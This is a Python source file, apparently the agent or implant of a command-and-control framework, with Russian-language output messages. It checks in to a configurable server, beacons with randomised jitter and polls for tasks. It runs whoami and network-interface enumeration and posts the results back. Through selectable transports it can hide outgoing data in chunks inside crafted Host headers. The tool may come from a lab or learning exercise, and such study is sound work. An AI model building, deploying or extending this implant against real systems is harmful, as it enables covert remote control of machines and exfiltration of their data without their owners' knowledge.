import json
import os
import random
import socket
import subprocess
import time
from pathlib import Path
from uuid import UUID
import psutil
import requests
from profiles import PROFILES, validate_profile, split_host_parts, HOST_SUFFIX
import secrets


SERVER_URL = os.environ.get("BOT_SERVER", "http://127.0.0.1:5000")
PROFILE_NAME = os.environ.get("BOT_PROFILE", "standard")
SLEEP = float(os.environ.get("BOT_SLEEP", "5"))
JITTER = float(os.environ.get("BOT_JITTER", "0.3"))


def build_request(endpoint, profile, data, part_host=None):
    method = profile["method"].upper()
    transport = profile["transport"]
    field = profile["field"]
    if method not in ("GET", "POST"):
        raise ValueError("Профиль поддерживает только GET и POST")
    if transport not in ("json", "form", "query", "host"):
        raise ValueError("Неизвестный transport")
    if not isinstance(field, str) or not field.strip():
        raise ValueError("Нужно непустое имя поля")
    if method == "GET" and transport not in ("query", "host"):
        raise ValueError("Для GET используй query или host")
    if transport != "json" and isinstance(data, (dict, list)):
        data = json.dumps(data, ensure_ascii=False)
    url = f"{SERVER_URL.rstrip('/')}/{endpoint.lstrip('/')}"
    if transport == "host":
        if part_host is None:
            raise ValueError("Для host нужна часть")
        return {
            "method": method,
            "url": url,
            "headers": {"Host": part_host},
            "timeout": 5,
        }
    argument = {"json": "json", "form": "data", "query": "params"}[transport]
    return {
        "method": method,
        "url": url,
        argument: {field: data},
        "timeout": 5,
    }


def next_sleep(sleep=SLEEP, jitter=JITTER):
    jitter = min(max(jitter, 0.0), 1.0)
    delay = random.uniform(sleep * (1 - jitter), sleep * (1 + jitter))
    return max(0.1, delay)


def load_config():
    if PROFILE_NAME not in PROFILES:
        raise ValueError("BOT_PROFILE должен быть standard, mixed или host")
    path = Path(os.environ.get("BOT_CONFIG", str(
        Path(__file__).with_name(f"payload-{PROFILE_NAME}.json"))))
    if path.exists():
        config = json.loads(path.read_text(encoding="utf-8"))
        if config.get("server_url") != SERVER_URL:
            raise ValueError("В конфиге другой сервер. Выбери новый файл BOT_CONFIG")
    else:
        response = requests.post(f"{SERVER_URL}/payloads",
                                 json={"profile": PROFILE_NAME}, timeout=5)
        response.raise_for_status()
        config = response.json()
        config["server_url"] = SERVER_URL
        validate_profile(config["profile"])
        UUID(config["payload_uuid"])
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(config, ensure_ascii=False, indent=2), encoding="utf-8")
    validate_profile(config["profile"])
    UUID(config["payload_uuid"])
    print("Конфиг:", path, "Payload:", config["payload_uuid"], flush=True)
    return config


def profile_request(endpoint, operation, data, config):
    rule = config["profile"][operation]
    headers_base = {"X-Payload-UUID": config["payload_uuid"]}
    if rule["transport"] != "host":
        options = build_request(endpoint, rule, data)
        options["headers"] = {**options.get("headers", {}), **headers_base}
        print(rule["method"], endpoint, rule["transport"], rule["field"], flush=True)
        response = requests.request(**options)
        response.raise_for_status()
        return response.json()

    if isinstance(data, (dict, list)):
        text = json.dumps(data, ensure_ascii=False)
    else:
        text = str(data)
    parts = split_host_parts(text)
    message_id = secrets.token_hex(6)
    print(rule["method"], endpoint, "host", f"{len(parts)} частей", flush=True)
    result = None
    for number, part in enumerate(parts, 1):
        host = f"m.{message_id}.{number}.{len(parts)}.{part}.{HOST_SUFFIX}"
        options = build_request(endpoint, rule, data, part_host=host)
        options["headers"] = {**options.get("headers", {}), **headers_base}
        response = requests.request(**options)
        response.raise_for_status()
        result = response.json()
        if number < len(parts) and "received" not in result:
            raise ValueError("Сервер не принял промежуточную часть")
    return result


def checkin(config):
    data = profile_request("/checkin", "checkin", config["payload_uuid"], config)
    return data["callback_uuid"]


def get_task(callback_uuid, config):
    return profile_request("/poll", "get_task", callback_uuid, config)["task"]


def execute(command):
    if command == "whoami":
        program = str(Path(os.environ["SystemRoot"]) / "System32" / "whoami.exe") if os.name == "nt" else "whoami"
        return subprocess.check_output(
            [program], encoding="oem" if os.name == "nt" else "utf-8",
            errors="replace", timeout=5
        ).strip()
    if command == "ip":
        lines = []
        for name, addresses in psutil.net_if_addrs().items():
            for address in addresses:
                if address.family in (socket.AF_INET, socket.AF_INET6):
                    lines.append(f"{name}: {address.address}")
        return "\n".join(lines) or "IP адресов не нашёл"
    if command == "exit":
        return "Выхожу"
    raise ValueError("дай норм команду")


def send_result(callback_uuid, task_id, result, config):
    data = {"callback_uuid": callback_uuid, "task_id": task_id, "result": result}
    profile_request("/results", "post_task", data, config)


def run(callback_uuid, config):
    pending = None
    while True:
        try:
            if pending is None:
                task = get_task(callback_uuid, config)
                if task is not None:
                    print("Задача:", task["task_id"], task["command"], flush=True)
                    try:
                        result = execute(task["command"])
                    except (OSError, ValueError, subprocess.SubprocessError) as error:
                        result = f"Ошибка: {error}"
                    pending = {"task": task, "result": result[:20000]}
            if pending is not None:
                task = pending["task"]
                send_result(callback_uuid, task["task_id"], pending["result"], config)
                print("Отдал результат:", task["task_id"], flush=True)
                if task["command"] == "exit":
                    print("Вышел", flush=True)
                    return
                pending = None
        except requests.RequestException as error:
            if error.response is not None and 400 <= error.response.status_code < 500:
                print("Сервер отказал:", error.response.text, flush=True)
                return
            print("Связь пропала, попробую ещё:", error, flush=True)
        delay = next_sleep()
        print(f"Сплю {delay:.2f} сек", flush=True)
        time.sleep(delay)


if __name__ == "__main__":
    try:
        config = load_config()
        callback_uuid = checkin(config)
        print("ЮИД:", callback_uuid, flush=True)
        run(callback_uuid, config)
    except requests.RequestException as error:
        print("Не смог зарегистрироваться:", error)
    except (KeyError, ValueError, TypeError, AttributeError, OSError) as error:
        print("Ошибка конфига или ответа сервера:", error)
    except KeyboardInterrupt:
        print("\nОстановил")
